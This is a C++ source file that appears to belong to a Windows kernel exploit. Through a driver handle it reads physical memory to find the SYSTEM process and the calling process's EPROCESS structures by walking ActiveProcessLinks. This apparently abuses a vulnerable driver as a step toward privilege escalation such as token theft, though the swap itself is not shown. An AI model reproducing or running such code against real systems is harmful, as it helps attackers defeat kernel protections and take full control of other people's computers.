#include "process.hpp"

namespace process {
	uintptr_t PsInitialSystemProcess(HANDLE driver) {
		uintptr_t NtOs = virtual_memory::NtoskrnlBaseAddress();
		if (!NtOs) {
			std::cout << "[-] Failed to get Nt\n";
			return -1;
		}

		// Locating PsInitialSystemProcess address
		HMODULE hModule = LoadLibrary(L"ntoskrnl.exe");
		uintptr_t PsInitialSystemProcessOffset = reinterpret_cast<uintptr_t>(GetProcAddress(hModule, "PsInitialSystemProcess"))
			- reinterpret_cast<uintptr_t>(hModule);
		uintptr_t PsGetCurrentProcessOffset = reinterpret_cast<uintptr_t>(GetProcAddress(hModule, "PsGetCurrentProcess"))
			- reinterpret_cast<uintptr_t>(hModule);
		FreeLibrary(hModule);

		std::cout << std::endl;
		uintptr_t PsInitialSystemProcessAddress = NtOs + PsInitialSystemProcessOffset;
		//std::cout << "[+] PsInitialSystemProcess Address : 0x" << std::hex << PsInitialSystemProcessAddress << std::endl;
		converted_address = virtual_memory::convert_virtual_to_physical(driver, pml4Base, PsInitialSystemProcessAddress);
		read_data = memory::read_physical_memory(driver, converted_address, &buffer, sizeof(uintptr_t));
		//std::cout << "[+] PsInitialSystemProcess : 0x" << std::hex << buffer << std::endl;

		std::cout << std::endl;

		return buffer;
	}

	uintptr_t PsGetCurrentProcess(HANDLE driver) {
		uintptr_t pEPROCESS = PsInitialSystemProcess(driver);

		// walk ActiveProcessLinks until we find our pid
		LIST_ENTRY ActiveProcessLinks;
		converted_address = virtual_memory::convert_virtual_to_physical(driver, pml4Base, pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64));
		read_data = memory::read_physical_memory(driver, converted_address, &ActiveProcessLinks, sizeof(LIST_ENTRY));

		uintptr_t res = 0x0;

		while (TRUE) {
			DWORD64 UniqueProcessId = 0;

			// adjust EPROCESS pointer for next entry
			pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64);

			// get pid
			converted_address = virtual_memory::convert_virtual_to_physical(driver, pml4Base, pEPROCESS + UniqueProcessIdOffset);
			read_data = memory::read_physical_memory(driver, converted_address, &UniqueProcessId, sizeof(DWORD64));

			// is this our pid?
			if (GetCurrentProcessId() == UniqueProcessId) {
				res = pEPROCESS;
				break;
			}

			// get next entry
			converted_address = virtual_memory::convert_virtual_to_physical(driver, pml4Base, pEPROCESS + UniqueProcessIdOffset + sizeof(uintptr_t));
			read_data = memory::read_physical_memory(driver, converted_address, &ActiveProcessLinks, sizeof(LIST_ENTRY));

			// if next is the same as last, we reached the end
			if (pEPROCESS == (DWORD64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64))
				break;
		}

		return res;
	}
}